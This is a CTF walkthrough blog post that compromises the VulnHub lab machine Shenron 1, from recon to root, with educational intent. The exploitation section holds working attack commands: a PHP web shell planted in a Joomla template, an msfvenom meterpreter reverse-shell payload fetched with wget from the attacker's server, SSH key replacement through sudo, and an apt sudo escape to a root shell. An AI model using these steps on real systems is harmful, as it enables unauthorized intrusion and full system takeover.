---
title: CTF Walkthrough for VulnHub Machine Shenron 1
date: 2024-09-03 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [Vulnhub, Writeup, Shenron, Machine, Joomla]   
image:
   path: /assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/box-shenron1.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Shenron 1 which is the first machine of the Vulnhub Shenron series machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Shenron 1<br>
Goal: Get two flags<br>
Difficulty: Beginner to Intermediate<br>
Operating System: Linux<br>
Download link: [Shenron-1](https://download.vulnhub.com/shenron/shenron-1.ova)<br>
### Tools used
1) Nmap<br>
2) Netcat<br>
3) ffuf
4) Metasploit Framework<br>
### Environment Set up
To ensure success as a penetration tester, staying organised is crucial. Proper organisation streamlines documentation and tracking of progress. In this workshop, we will create a directory tree to systematically manage our work, with detailed descriptions of each directory's purpose available here.
![Working Dir](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/working-dir.png)

## Reconnaissance
As in every penetration test, we need to identify our target on the network. We can do this by launching a quick host discovery scan against the network using Nmap. To perform the host verification we need to know our current subnet. We can perform these using the commands below:<br>
Current subnet identification: ```ip a```<br>
Host discovery scan: ```sudo nmap -sn 10.0.2.15/24```<br><br>
![Host Identification](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/target-dis.png)

After identifying our target on the network we need to know what services are run by our target to create different possible attack scenarios. We can start a service scan on our target using Nmap with the command below.<br> ```sudo nmap -sV -sC  10.0.2.4 -oA services-dis```<br><br>
![Service Scan](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/service-scan.png)

We can see that the target is running both an SSH and an Apache web server. Web applications are known to contain many vulnerabilities so let's browse to the web application for further analyses. Unfortunately for us, we fall on the default Apache index page.
![Wep App Index Page](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/web%20app%20index%20page.png)

In a real-world scenario, the default page might be left temporarily during the setup or testing phases of the web application. So let's try to find any hidden directories in the web application. I performed the fuzzing using **ffuf**, but you can use any tool of your preference. Here’s the command I used:<br>
```ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.0.2.4/FUZZ```<br><br>
![Directory Fuzzing](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/dir-fuzzing-1.png)

The fuzzing process uncovers two interesting directories which are the *test* and *joomla*. The directory Joomla already gives us a hint that the web application may be running the well-known Joomla CMS. Let's browse these directories chronologically as they are in our results. Upon browsing to the test directory, we noticed that directory listing is enabled, which constitutes a vulnerability since it appears to expose a file containing passwords. We should document this finding in our Findings folder.
![Directory Listing](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/directory-listing.png)

Accessing the file reveals a pair of credentials for an admin user. We can keep a note of these credentials in a file.
![File Accessed](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/file-accessed-1.png)

Nex let's visit the second directory *joomla* uncovered during our fuzzing. We can see that our target runs the well-known Joomla CMS. Remember, we discovered credentials hidden in the comments of the password file. Let's use these credentials to log in to the Joomla administrative interface, which is typically located in the administrator directory.
*NB: By default, Joomla's administrative interface is accessed through the administrator directory.*
![Joomla Login](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/joomla-login.png)

## Exploitation
Great, we successfully logged in as the admin. Next, we move to Extensions -> Templates -> Templates where attempt to add a PHP shell to a PHP file in an unused template. Here, I chose the protostar template and added a basic PHP shell ``` system($_GET["cmd"]);``` to the error.php file.
*NB: In a real-world penetration test try to use a more complicated name for the GET parameter value such as a hash. This is because anyone can access that file hence if a common name is used, attackers may bruteforce it and also use it to establish their foothold in your client's environment.*
![Template Modification](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/template-modification.png)
After modifying the template we can now execute commands on our target by browsing to the page and specifying the command we want to run as the GET parameter's value.<br> 
```curl http://10.0.2.4/joomla/templates/protostar/error.php?cmd=id```<br><br>
![RCE Test](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/rce-test.png)

This web shell is good but to facilitate our work, we will employ Meterpreter, a sophisticated payload integrated into the Metasploit Framework. To use a meterpreter on our target we first need to craft one using the msfvenom tool from the Metasploit Framework.<br>
```msfvenom -p linux/x64/meterpreter_reverse_tcp  LHOST=10.0.2.15 LPORT=4444 -f elf > update.elf```<br><br>
![Payload Crafting](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/payload-crafting-1.png)
After crafting the executable payload we then start a small HTTP server to transfer the payload to our target using Python3 http.server module.
![Python Server](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/python-server-1.png)

We then use wget on the target to download the payload to the /tmp directory.<br> ```wget http://10.0.2.15/update.elf -O /tmp/update.elf```<br><br>
![Download Operation](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/download-operation-1.png)
Before executing the payload, we need to configure and run a listener in Metasploit.
![Metasploit Set Up](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/metasploit-set-up.png)
After starting the listener we now give execution permission to our payload and execute it.
![Payload Execution](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/payload-exec-1.png)
Upon going back to the listener, we can see that the listener caught a reverse shell connection from the target.
![Catching Shell](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/catching-shell-1.png)
Web applications usually contain a configuration file that stores database credentials. These credentials are used by the web application to connect to the database server. It's a good habit to search for this configuration file which is usually located in the web root directory. On this machine, the file is named web.config.txt. Reading its contents reveals the credentials for the database user.<br> *NB: The name of this file may change depending on the preference of the web administrator.*
![Web Config File](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/web-root-dir.png)
![DB User Creds](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/db-creds.png)
We see that the credentials belong to the user Jenny who is also a user on the target machine. Let's try to authenticate as Jenny.<br>
*Tip: To enumerate users on the system just cat the content of the /etc/passwd file*
![User Auth](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/user-auth-1.png)

## Post Exploitation
At this stage in our CTF assessment, we have identified that the user is vulnerable to password reuse. Using this password, we can now check if the user has any sudo privileges.
![Sudo Right](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/sudo-right-1.png)

Great, the user Jenny can perform copy operations by impersonating Shenron. Since we observed an SSH service running during our service enumeration, let's use the sudo privileges to replace Shenron's SSH key. To do this, I first generate a key pair \(private, public\) on my attack host and upload the public key using the same method used above but you may decide to upload it using our powerful meterpreter.
![SSH Key Gen](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/ssh-key-gen-1.png)
After uploading the public key I replaced the **authorized_keys** file in Shenron's **.ssh** directory by impersonating Shenron using our sudo privileges and then afterward I used the private key to log in as Shenron.
![SSH Key Replace](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/ssh-key-replacement-1.png)
![SSH Login](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/ssh-login-1.png)
We successfully logged in as Shenron we can now use this new account to read the user's flag and further the enumeration process of the system.
![User Flag](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/user-flag.png)
Some users tend to store their passwords in specific files so, let's try to enumerate all files having the string 'password' in their names with the command below.<br> ```find / -iname *password* 2>/dev/null```.<br> We got a hit in the /var/opt directory. Reading the content of the files exposes to us what seems like Shenron's password.
![File Enum](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/file-enum-2.png)
We can now use that password to read Shenron's sudo privileges.
![Sudo Right](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/sudo-right-2.png)
We observe that this account can be used to run apt with root privilege. Let's browse to [GTFOBins](https://gtfobins.github.io/gtfobins/apt/#sudo) to see how we can exploit this right to obtain a root shell. the command GTFOBins provides us with a way of exploiting this privilege but I chose to use the command below. <br>```sudo /usr/bin/apt update -o APT::Update::Pre-Invoke::=/bin/sh```<br><br>
![Root Access](/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/root-access.png)<br>
Great, we have obtained root access to the machine, having this access means we own the machine and can do whatever we want. 

## Conclusion
Congratulations, In this walkthrough, you learned how a seemingly simple file listing vulnerability, which exposes sensitive information, can be exploited to take over a machine. We demonstrated how unauthorized access to file directories and the disclosure of sensitive files can provide critical information that attackers can use to escalate privileges and gain full control of the system. This walkthrough highlighted the importance of securing file listings and properly managing access controls to prevent such vulnerabilities from being exploited.. In a real-world assessment, the last step will be to gather our findings and draft a report for our clients. Thanks for following up on this walkthrough.
